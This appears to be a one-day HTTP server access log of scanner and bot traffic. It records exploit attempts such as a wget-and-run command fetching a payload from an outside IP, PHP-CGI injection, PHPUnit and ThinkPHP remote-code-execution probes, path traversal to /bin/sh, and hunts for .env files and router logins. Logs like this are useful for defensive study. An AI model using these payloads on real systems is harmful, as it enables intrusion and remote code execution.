+164.92.235.213 - - [06/Aug/2025 06:07:18] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¤+\x9d¼LÈOµÚÍ®\x8b4ÒÜ\x87­Gú®s¬êQTI\x13ÙÈçZ´ µ\x96ø\x14;\x8a\x11ýÇ\x80Õ²c&Õ'\x9ea\x90 Nç}K\x96®1\x9bXÜ\x84&\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+164.92.235.213 - - [06/Aug/2025 06:07:18] "[33mGET /query?q=SHOW+DIAGNOSTICS HTTP/1.1[0m" 404 -
+167.71.40.115 - - [06/Aug/2025 06:07:18] code 400, message Bad request version ("\x90Ð\x89K](¦ìwù\x88LzÞRäJýDü&\x9cë\x12ë\x14wêèpÊÖ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+167.71.40.115 - - [06/Aug/2025 06:07:18] "[31m[1m\x16\x03\x01\x01$\x01\x00\x01 \x03\x03E\x05_=¢uyöK|\x99\x039!;«)mG\x83*Ôüø,\x09\x86ü-\x09\x17M \x90Ð\x89K](¦ìwù\x88LzÞRäJýDü&\x9cë\x12ë\x14wêèpÊÖ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+206.81.27.120 - - [06/Aug/2025 06:07:18] "[33mGET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1[0m" 404 -
+164.92.235.213 - - [06/Aug/2025 06:07:18] code 400, message Bad request version ('À\x13À')
+164.92.235.213 - - [06/Aug/2025 06:07:18] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x88\x10\x99\x88Mµ\x94\x9axÅÎ.\x16ÞH1\x12Æô$êð\x7f ¯dÿM#4\x12« \x12Rä\x15îBÚù9Ý(ý\x91v·E%½F_\x7fÕE´¨\x9eS\x01`~\x96å\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+128.199.155.113 - - [06/Aug/2025 06:07:19] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+207.154.251.9 - - [06/Aug/2025 06:10:09] "[33mGET /v2/_catalog HTTP/1.1[0m" 404 -
+104.234.115.186 - - [06/Aug/2025 06:44:19] "GET / HTTP/1.0" 200 -
+104.234.115.186 - - [06/Aug/2025 06:44:34] code 400, message Bad request version ('À\x14À')
+104.234.115.186 - - [06/Aug/2025 06:44:34] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x01+.ìÑMÑr×Å=çiUè\x04\x0c\x09À¼0¥\x07\x83oºÊo&\x95AR äI´ß\x03½#\x02¯\x09d[á!Ì>\x7fë~)ßü{¤¾àó<\x9cç¹n\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+104.234.115.186 - - [06/Aug/2025 06:44:56] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [06/Aug/2025 06:46:23] "GET / HTTP/1.1" 200 -
+206.168.34.222 - - [06/Aug/2025 06:46:46] "GET / HTTP/1.1" 200 -
+206.168.34.222 - - [06/Aug/2025 06:46:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.222 - - [06/Aug/2025 06:46:54] code 505, message Invalid HTTP version (2.0)
+206.168.34.222 - - [06/Aug/2025 06:46:54] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.222 - - [06/Aug/2025 06:47:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.222 - - [06/Aug/2025 06:47:09] code 505, message Invalid HTTP version (2.0)
+206.168.34.222 - - [06/Aug/2025 06:47:09] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.222 - - [06/Aug/2025 06:47:19] code 400, message Bad request version ('À\x14À')
+206.168.34.222 - - [06/Aug/2025 06:47:19] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03èðEè\x81\x06\x04\x1fÈ­D?lyÐ,½\x1a²¡2\x9cu¾´"T7\x01P\x96\x04 >\x1d2Þ\x9bî\x9a%\x9dÂKßÙ¼¿:\x04lÐ¢\x8f\x8b\x1eUø>\x96Û$è$\x94\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+206.168.34.222 - - [06/Aug/2025 06:47:21] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+104.234.115.186 - - [06/Aug/2025 06:48:24] code 400, message Bad request version ('À\x14À')
+104.234.115.186 - - [06/Aug/2025 06:48:24] "[31m[1m\x16\x03\x01\x00ú\x01\x00\x00ö\x03\x03\x87l\x93v\x1d\x80\x8c0þË\x0cut¸z±Xáb³\x9dÌh\x87<\x14ìu%üJÑ \x85\x0e¿k\x9aõy8"¥¿T\x1d\x1a6F4§f*ËìnqO\x08½³\x9ch¸\x07\x002À/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+104.234.115.186 - - [06/Aug/2025 06:48:34] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+204.76.203.219 - - [06/Aug/2025 06:49:33] "GET / HTTP/1.1" 200 -
+195.178.110.21 - - [06/Aug/2025 06:58:22] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [06/Aug/2025 06:58:43] "[33mGET /login.asp HTTP/1.1[0m" 404 -
+185.242.226.99 - - [06/Aug/2025 07:14:23] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03.\x18¤²½=\x8d\x12\x9eH\x01SS¿É9\x86m\x92')
+185.242.226.99 - - [06/Aug/2025 07:14:23] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03.\x18¤²½=\x8d\x12\x9eH\x01SS¿É9\x86m\x92\x0cd\x15z¾)"[0m" 400 -
+149.50.96.5 - - [06/Aug/2025 07:47:06] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [06/Aug/2025 07:53:39] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [06/Aug/2025 08:19:53] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [06/Aug/2025 08:26:30] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [06/Aug/2025 08:42:50] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+196.251.86.50 - - [06/Aug/2025 08:49:31] "GET / HTTP/1.0" 200 -
+80.75.212.17 - - [06/Aug/2025 08:57:26] "[33mCONNECT httpbin.org:443 HTTP/1.1[0m" 404 -
+150.107.38.40 - - [06/Aug/2025 09:25:32] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+150.107.38.40 - - [06/Aug/2025 09:25:32] "[31m[1m\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03-Ê`6\x09 !ôf,ÇuhO2½"íf\x96û\x1c¿\x1b\x8cÿqi%á\x96Ì ËS1Y\x8a\x99ÊK\x9d \x87ûX¬ÄHî÷Ï\x96o\x8aè\x15ú\x1bÞ½^^\x91Î\x004Ì¨Ì©À/À0À+À,À\x09\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À[0m" 400 -
+150.107.38.40 - - [06/Aug/2025 09:25:43] "GET / HTTP/1.1" 200 -
+150.107.38.40 - - [06/Aug/2025 09:25:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+150.107.38.40 - - [06/Aug/2025 09:25:44] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+150.107.38.40 - - [06/Aug/2025 09:25:44] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+150.107.38.40 - - [06/Aug/2025 09:25:45] "[33mGET /config.json HTTP/1.1[0m" 404 -
+81.17.23.242 - - [06/Aug/2025 09:48:21] "GET / HTTP/1.1" 200 -
+147.185.132.71 - - [06/Aug/2025 09:52:03] "GET / HTTP/1.1" 200 -
+172.210.68.2 - - [06/Aug/2025 10:04:18] "GET / HTTP/1.1" 200 -
+193.198.158.252 - - [06/Aug/2025 10:08:51] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [06/Aug/2025 10:11:44] "GET / HTTP/1.1" 200 -
+45.194.66.6 - - [06/Aug/2025 10:21:25] "GET / HTTP/1.1" 200 -
+199.204.96.10 - - [06/Aug/2025 10:29:11] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+149.50.96.5 - - [06/Aug/2025 11:01:00] "[33mPOST /bapply.cgi HTTP/1.1[0m" 404 -
+159.65.182.114 - - [06/Aug/2025 11:17:28] "[33mGET /.env HTTP/1.1[0m" 404 -
+159.65.182.114 - - [06/Aug/2025 11:17:29] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+103.20.102.84 - - [06/Aug/2025 11:18:04] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+149.50.96.5 - - [06/Aug/2025 11:36:37] "[33mGET /cgi-bin/index.html HTTP/1.1[0m" 404 -
+93.174.93.12 - - [06/Aug/2025 11:51:37] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [06/Aug/2025 11:51:37] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+45.156.129.46 - - [06/Aug/2025 11:53:10] "GET / HTTP/1.1" 200 -
+195.184.76.237 - - [06/Aug/2025 12:08:42] code 400, message Bad request version ('À#À¬À®À+À')
+195.184.76.237 - - [06/Aug/2025 12:08:42] "[31m[1m\x16\x03\x03\x01§\x01\x00\x01£\x03\x03\x10°ô½âÚ\x952éBì\x86\x87Ð\x02'È\x1b\x11§\x1d\x81à$ùÔÖRÝÒ2) &ð-j\x8e?Í.Ü'²]36ø>Êä4n\x820¬Ñ½cõ/-ÓÓ¬\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À[0m" 400 -
+195.184.76.238 - - [06/Aug/2025 12:08:45] "GET / HTTP/1.1" 200 -
+195.184.76.102 - - [06/Aug/2025 12:24:39] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+149.50.96.114 - - [06/Aug/2025 12:41:35] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [06/Aug/2025 12:42:47] "GET / HTTP/1.1" 200 -
+81.17.23.242 - - [06/Aug/2025 13:02:09] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [06/Aug/2025 13:20:28] "GET / HTTP/1.0" 200 -
+3.131.215.38 - - [06/Aug/2025 13:21:48] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [06/Aug/2025 13:25:35] "GET / HTTP/1.1" 200 -
+129.146.52.207 - - [06/Aug/2025 13:29:37] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:39] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:40] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:42] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:44] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:46] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:47] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:50] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:52] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:53] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:55] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:57] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:29:59] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:01] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:03] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:05] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:07] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:09] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:10] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:13] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:15] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:17] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:19] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:22] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:23] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:25] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:28] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:30] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:31] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:33] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:35] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:37] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:39] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:41] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:43] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:44] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:46] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:48] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:51] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:53] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:54] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:57] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:30:59] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:31:01] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+129.146.52.207 - - [06/Aug/2025 13:31:02] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+204.76.203.219 - - [06/Aug/2025 13:55:37] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [06/Aug/2025 13:56:33] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+3.130.96.91 - - [06/Aug/2025 13:56:50] "GET / HTTP/1.1" 200 -
+3.130.96.91 - - [06/Aug/2025 13:59:14] "GET / HTTP/1.1" 200 -
+3.130.96.91 - - [06/Aug/2025 14:02:37] code 400, message Bad request version ('À\x14À')
+3.130.96.91 - - [06/Aug/2025 14:02:37] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03s\x91©ÕPçXÇWõ\x16©Bgý¤Hî\x18\x04b\x17\x0bv®Yçµ\x0b*\x1e\x9c\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+3.130.96.91 - - [06/Aug/2025 14:03:51] code 400, message Bad request syntax ('SSH-2.0-Go')
+3.130.96.91 - - [06/Aug/2025 14:03:51] "[31m[1mSSH-2.0-Go[0m" 400 -
+3.130.96.91 - - [06/Aug/2025 14:07:04] code 400, message Bad request version ('ÔS\x90Ë')
+3.130.96.91 - - [06/Aug/2025 14:07:04] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x0d\x95J&MÂ¦\x1eÔS\x90Ë[0m" 400 -
+149.50.96.5 - - [06/Aug/2025 14:08:11] "GET / HTTP/1.1" 200 -
+35.195.241.97 - - [06/Aug/2025 14:10:56] "GET / HTTP/1.1" 200 -
+45.135.194.136 - - [06/Aug/2025 14:12:06] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [06/Aug/2025 14:15:35] code 400, message Bad request version ('}')
+141.98.11.57 - - [06/Aug/2025 14:15:35] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+137.184.226.250 - - [06/Aug/2025 14:39:16] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+137.184.226.250 - - [06/Aug/2025 14:39:24] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+137.184.226.250 - - [06/Aug/2025 14:39:33] "GET / HTTP/1.1" 200 -
+45.194.66.6 - - [06/Aug/2025 14:58:54] "GET / HTTP/1.1" 200 -
+197.52.5.31 - - [06/Aug/2025 15:09:02] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+197.52.5.31 - - [06/Aug/2025 15:09:02] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+35.233.7.110 - - [06/Aug/2025 15:12:08] code 400, message Bad request version ('À\x13À')
+35.233.7.110 - - [06/Aug/2025 15:12:08] "[31m[1m\x16\x03\x01\x00þ\x01\x00\x00ú\x03\x03ÑRê\x95\x94M\x9d±\\Åß\x87\x1bÁ\x00\x14§Ë\x10NV\x9cG\x7fà¡é\x18_PF¸ \x15\x02\x9cIu_×º}\x8dÈ¥\x00¿6QY\x00¹Ã÷'l Wó79\x80<SI\x002À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+35.233.7.110 - - [06/Aug/2025 15:12:13] "GET / HTTP/1.1" 200 -
+2.59.22.234 - - [06/Aug/2025 15:32:06] "GET / HTTP/1.1" 200 -
+2.59.22.234 - - [06/Aug/2025 15:32:07] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+2.59.22.234 - - [06/Aug/2025 15:32:07] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+2.59.22.234 - - [06/Aug/2025 15:32:07] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+2.59.22.234 - - [06/Aug/2025 15:32:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+196.251.114.43 - - [06/Aug/2025 15:55:40] "[33mGET /.env HTTP/1.1[0m" 404 -
+149.50.96.114 - - [06/Aug/2025 16:00:17] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [06/Aug/2025 16:09:20] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [06/Aug/2025 16:19:57] "[33mGET /admin/login.asp HTTP/1.1[0m" 404 -
+91.224.92.17 - - [06/Aug/2025 16:37:32] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [06/Aug/2025 16:41:05] "GET / HTTP/1.0" 200 -
+91.231.89.247 - - [06/Aug/2025 16:45:04] code 400, message Bad request version ('À#À¬À®À+À')
+91.231.89.247 - - [06/Aug/2025 16:45:04] "[31m[1m\x16\x03\x03\x01§\x01\x00\x01£\x03\x03*\x16\x8aÑ¦«\x07\x1b{¯\x98k\x94\x9e­\x11Oÿ\x7f=Í\x0eL¼Ó~í?±!s\x1f µpÂ\x18w!¡\x0bb;¡g·#\x1c,\x81TÊ³ôä1,b\x02\x84{\x14}pÆ\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À[0m" 400 -
+91.231.89.246 - - [06/Aug/2025 16:45:08] "GET / HTTP/1.1" 200 -
+45.135.194.136 - - [06/Aug/2025 16:53:17] "GET / HTTP/1.1" 200 -
+91.196.152.185 - - [06/Aug/2025 17:03:24] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+204.76.203.219 - - [06/Aug/2025 17:13:20] "GET / HTTP/1.1" 200 -
+81.17.23.242 - - [06/Aug/2025 17:18:21] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [06/Aug/2025 17:23:11] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [06/Aug/2025 18:17:20] "GET / HTTP/1.1" 200 -
+68.69.186.238 - - [06/Aug/2025 18:21:53] "GET / HTTP/1.1" 200 -
+81.17.23.242 - - [06/Aug/2025 18:32:23] "GET / HTTP/1.1" 200 -
+196.251.86.50 - - [06/Aug/2025 18:51:10] "GET / HTTP/1.0" 200 -
+91.224.92.17 - - [06/Aug/2025 18:54:32] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [06/Aug/2025 19:10:59] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+185.242.226.99 - - [06/Aug/2025 19:20:52] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [06/Aug/2025 19:20:52] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03\x12 \x0b\x8cÏN\x10\x97¡¿\x02\x86OKãW¾¥ÈA¥ Çn\x04ú÷\x19ÿ\x9a{"\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+59.182.153.27 - - [06/Aug/2025 19:32:54] "[33mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0[0m" 404 -
+91.224.92.17 - - [06/Aug/2025 20:04:14] "GET / HTTP/1.1" 200 -
+185.170.144.3 - - [06/Aug/2025 20:19:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.170.144.3 - - [06/Aug/2025 20:19:26] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+91.224.92.17 - - [06/Aug/2025 20:52:00] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [06/Aug/2025 20:58:58] "GET / HTTP/1.1" 200 -
+87.120.191.6 - - [06/Aug/2025 21:04:10] "GET / HTTP/1.1" 200 -
+54.221.118.197 - - [06/Aug/2025 21:14:22] "GET / HTTP/1.1" 200 -
+81.17.23.242 - - [06/Aug/2025 21:22:58] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [06/Aug/2025 21:39:08] "GET / HTTP/1.1" 200 -
+176.65.148.92 - - [06/Aug/2025 21:48:23] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:13] code 400, message Bad request version ('À\x14À')
+147.182.226.223 - - [06/Aug/2025 22:05:13] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03]Å\x92\x8dv\x0eU44w\x18\x8aG\x15¾-X\x05F\x12\x03èjñî\x01\x09\x83E\x92\x13õ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+147.182.226.223 - - [06/Aug/2025 22:05:13] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03!ò\x15\x86laµ')
+147.182.226.223 - - [06/Aug/2025 22:05:13] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03!ò\x15\x86laµ[0m" 400 -
+147.182.226.223 - - [06/Aug/2025 22:05:13] "GET / HTTP/1.1" 200 -
+147.182.226.223 - - [06/Aug/2025 22:05:14] "[33mGET /form.html HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:14] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:14] "[33mGET /t4 HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:15] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:15] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:15] "[33mGET /1.php HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:16] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+147.182.226.223 - - [06/Aug/2025 22:05:16] "[33mGET /password.php HTTP/1.1[0m" 404 -
+79.124.58.198 - - [06/Aug/2025 22:07:19] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+172.212.224.104 - - [06/Aug/2025 22:23:13] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+91.224.92.17 - - [06/Aug/2025 22:41:04] "GET / HTTP/1.1" 200 -
+20.106.206.76 - - [06/Aug/2025 22:59:05] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+194.50.16.252 - - [06/Aug/2025 23:14:37] "GET / HTTP/1.1" 200 -
+198.235.24.77 - - [06/Aug/2025 23:17:11] "GET / HTTP/1.0" 200 -
+47.91.91.123 - - [06/Aug/2025 23:20:44] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x18Ð\x06É()\\ã+«V\x06|m\x90uIEËMÚhÛ¯ö\x13bÝ\x15ðO¢\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+47.91.91.123 - - [06/Aug/2025 23:20:44] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x18Ð\x06É()\\ã+«V\x06|m\x90uIEËMÚhÛ¯ö\x13bÝ\x15ðO¢\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
